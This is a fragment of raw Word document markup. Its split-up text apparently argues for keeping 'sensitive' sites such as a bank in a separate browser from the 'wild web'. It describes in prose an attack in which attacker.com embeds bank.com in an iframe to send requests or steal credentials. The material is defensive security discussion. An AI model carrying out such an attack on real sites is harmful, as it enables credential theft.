          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>am</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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le,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44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ld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w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>se</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:w w:val="10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Chr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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me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ead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d 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irefox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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i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g.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vi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aises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est</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="7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w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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t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er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wo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/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ws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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">better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e,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ow</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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purp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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tio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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,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ass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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me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ch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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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wser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ses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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="104"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eci</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="102"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>di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ecto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y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sto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1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te</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>mp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5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y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les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kies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2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ost.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lso</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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2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s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me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ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="48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ever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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="45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1"/>
          <w:w w:val="117"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>se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si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ive</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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wser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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sit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36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n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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si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ive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tes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ever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“w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>”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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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wser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4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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n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it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
          <w:w w:val="10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sites.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="824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br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w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11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ve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d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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="11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w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113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ts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 xml:space="preserve">ake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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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sec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ity</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11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ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr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tages</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="8"/>
          <w:w w:val="1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wo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="46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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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wsers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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avai</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="107"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>gle</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="20" w:line="253" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="152"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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wser</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.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w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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de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two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to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age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pacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr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ec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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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eir</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5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ow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,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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5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“s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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tive”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="1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 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ive”.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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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wser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/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proofErr w:type="gram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st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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ive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it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>es.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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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cat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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n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bar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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wser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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tab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am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7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s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>site,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tem</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p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a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y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6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les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st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ed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3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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n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it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13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di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ecto</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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y,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="7"/>
          <w:w w:val="1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ey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on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ac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ess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 xml:space="preserve">er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bs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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ose</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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loca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ion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bars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sen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ve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site.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proofErr w:type="gram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logs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45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b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n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k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c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om</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, 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5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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> a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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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vi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it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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attacker.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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>om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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o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 xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r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me</w:t>
      </w:r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bank.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, 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19"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108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21"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ests </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>issu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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d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iframe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3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-3"/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ta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n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8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b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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n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k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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c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>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-7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ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5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cre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr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ti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ls.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="1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x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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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ttack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4"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>agai</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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t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w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
